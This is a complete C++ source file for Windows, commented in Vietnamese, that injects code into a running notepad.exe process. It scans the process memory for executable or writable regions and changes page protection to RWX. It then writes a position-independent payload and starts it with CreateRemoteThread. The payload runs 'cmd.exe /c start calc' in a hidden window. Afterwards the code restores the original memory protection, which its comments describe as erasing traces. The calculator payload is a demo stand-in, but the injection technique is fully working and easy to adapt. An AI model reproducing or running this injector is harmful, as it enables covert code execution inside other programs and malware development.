#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>

// 1. Định nghĩa cấu trúc dữ liệu con trỏ tuyệt đối (Zero Static Buffers / PIC kịch trần)
typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);
typedef VOID(WINAPI* fnExitThread)(DWORD dwExitCode);

typedef struct _THREAD_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
    fnExitThread pExitThread; // BẢO VỆ: Địa chỉ tuyệt đối của ExitThread để đóng luồng êm đẹp
    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
} THREAD_DATA, * PTHREAD_DATA;

// 2. Hàm chức năng độc lập vị trí sẽ được ký sinh vào RAM đối phương
DWORD WINAPI RemoteParasitePayload(LPVOID lpParam) {
    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        // Khai hỏa bằng địa chỉ tuyệt đối, bẻ gãy hoàn toàn lỗi nhảy tương đối RIP
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }

    // GIẢI PHÁP ĐỘT PHÁ: Tuyệt đối không return để tránh làm sụp đổ Stack Frame của Notepad
    if (pData && pData->pExitThread) {
        pData->pExitThread(0); // Tự giải thoát luồng ký sinh một cách sạch sẽ
    }

    // Vòng lặp phòng thủ tối hậu nếu ExitThread bị chặn
    while (TRUE) {
        Sleep(1000);
    }
    return 0;
}

// Bộ quét RAM động tự động nhận diện PID, KHÔNG PHÂN BIỆT chữ hoa chữ thường
DWORD GetProcessIDByName(const std::wstring& processName) {
    DWORD processID = 0;
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
                processID = pe32.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return processID;
}

// Hàm cốt lõi nâng cấp: Săn lùng phân vùng bộ nhớ rảnh an toàn
PVOID HuntForAdaptiveMemoryRegion(HANDLE hProcess, SIZE_T requiredSize, BOOL& needsProtectToggle) {
    MEMORY_BASIC_INFORMATION mbi;
    LPVOID address = 0;
    PVOID fallbackAddress = NULL;

    needsProtectToggle = FALSE;

    // Duyệt qua toàn bộ bản đồ không gian địa chỉ bộ nhớ ảo của User-mode trên x64
    while (VirtualQueryEx(hProcess, address, &mbi, sizeof(mbi)) != 0) {

        // CHIẾN THUẬT LÝ TƯỞNG: Săn phân vùng COMMIT có sẵn thuộc tính PAGE_EXECUTE_READWRITE (RWX)
        if (mbi.State == MEM_COMMIT && mbi.Protect == PAGE_EXECUTE_READWRITE && mbi.RegionSize >= requiredSize) {
            if ((ULONG_PTR)mbi.BaseAddress > 0x1000000) {
                std::cout << "[+] SAN LUNG THANH CONG: Phat hien vung nho RWX nguyen ban tai: 0x" << mbi.BaseAddress << std::endl;
                return mbi.BaseAddress;
            }
        }

        // KỊCH BẢN DỰ PHÒNG CHỦ ĐỘNG: Săn các phân vùng Private Heap/Stack mang quyền RW rảnh (PAGE_READWRITE)
        if (mbi.State == MEM_COMMIT && mbi.Type == MEM_PRIVATE && mbi.Protect == PAGE_READWRITE &&
            mbi.RegionSize >= requiredSize && fallbackAddress == NULL) {

            if ((ULONG_PTR)mbi.BaseAddress > 0x1000000) {
                fallbackAddress = mbi.BaseAddress;
            }
        }

        address = (LPVOID)((ULONG_PTR)mbi.BaseAddress + mbi.RegionSize);
    }

    if (fallbackAddress != NULL) {
        std::cout << "[*] Kich hoat che do thich ung ky sinh vung nho thuoc tinh RW tai: 0x" << fallbackAddress << std::endl;
        needsProtectToggle = TRUE;
        return fallbackAddress;
    }

    return NULL;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 13: RWX ADAPTIVE HUNTING INJECTION REMOTE" << std::endl;
    std::cout << "====================================================" << std::endl;

    std::wstring targetProcess = L"notepad.exe";
    DWORD pid = GetProcessIDByName(targetProcess);

    if (pid == 0) {
        std::cerr << "[-] Notepad.exe khong chay! Vui long mo san Notepad truoc nhen." << std::endl;
        std::cin.get();
        return EXIT_FAILURE;
    }

    std::cout << "[+] Da tim thay Notepad.exe voi PID: " << pid << std::endl;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        std::cerr << "[-] OpenProcess failed!" << std::endl;
        return EXIT_FAILURE;
    }

    SIZE_T functionSize = 500;
    BOOL needsProtectToggle = FALSE;

    // Bước 1: Săn hốc nhớ thích ứng
    PVOID rwxTargetAddress = HuntForAdaptiveMemoryRegion(hProcess, functionSize, needsProtectToggle);

    if (rwxTargetAddress == NULL) {
        std::cerr << "[-] Khong tim thay phan vung nho hop le de ky sinh!" << std::endl;
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    // Bước 2: Cấp phát ô chứa tham số dữ liệu từ xa
    PTHREAD_DATA pRemoteData = (PTHREAD_DATA)VirtualAllocEx(hProcess, NULL, sizeof(THREAD_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemoteData) {
        std::cerr << "[-] VirtualAllocEx cho vung du lieu that bai!" << std::endl;
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    // Khởi tạo cấu trúc dữ liệu con trỏ tuyệt đối
    THREAD_DATA localData;
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        localData.pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
        localData.pExitThread = (fnExitThread)GetProcAddress(hKernel32, "ExitThread"); // Trích xuất động địa chỉ đóng luồng an toàn
    }
    strcpy_s(localData.szCommand, "cmd.exe /c start calc");

    // Đẩy tham số tuyệt đối vào RAM Notepad
    WriteProcessMemory(hProcess, pRemoteData, &localData, sizeof(THREAD_DATA), NULL);

    DWORD oldProtect = 0;
    // Mở khóa trang nhớ săn được sang RWX nếu rơi vào kịch bản thích ứng
    if (needsProtectToggle) {
        VirtualProtectEx(hProcess, rwxTargetAddress, functionSize, PAGE_EXECUTE_READWRITE, &oldProtect);
    }

    // Bước 3: KÝ SINH - Ghi đè mã máy payload
    BOOL isWritten = WriteProcessMemory(hProcess, rwxTargetAddress, (LPCVOID)RemoteParasitePayload, functionSize, NULL);

    if (!isWritten) {
        std::cerr << "[-] WriteProcessMemory vao phan vung ky sinh that bai!" << std::endl;
        if (needsProtectToggle) VirtualProtectEx(hProcess, rwxTargetAddress, functionSize, oldProtect, &oldProtect);
        VirtualFreeEx(hProcess, pRemoteData, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Nap ma may vao phan vung ky sinh hoan tot." << std::endl;

    // Bước 4: Khai hỏa luồng từ xa
    std::cout << "[*] Dang khoi tao luong CreateRemoteThread tu xa..." << std::endl;
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rwxTargetAddress, pRemoteData, 0, NULL);

    if (hThread != NULL) {
        // Chờ đợi 1 giây đồng bộ ngắn để lệnh WinExec kịp nổ tung trong Kernel trước khi dọn dẹp
        WaitForSingleObject(hThread, 1000);
        std::cout << "[+] Luong Thread ky sinh tu xa da thuc thi nhiem vu!" << std::endl;
        CloseHandle(hThread);
    }
    else {
        std::cerr << "[-] CreateRemoteThread that bai! Error: " << GetLastError() << std::endl;
    }

    // Phục hồi lại thuộc tính bảo vệ gốc để xóa sạch dấu vết
    if (needsProtectToggle) {
        VirtualProtectEx(hProcess, rwxTargetAddress, functionSize, oldProtect, &oldProtect);
        std::cout << "[+] Da khoi phuc lai thuoc tinh bao ve goc cua phan vung." << std::endl;
    }

    // Dọn dẹp tài nguyên phẳng sạch chống Memory Leak
    VirtualFreeEx(hProcess, pRemoteData, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    std::cout << "\n[+] RWX Hunting Injection Process Completed Successfully!" << std::endl;
    std::cout << "[*] Nhan phim Enter de dong cua so..." << std::endl;
    std::cin.get();
    return EXIT_SUCCESS;
}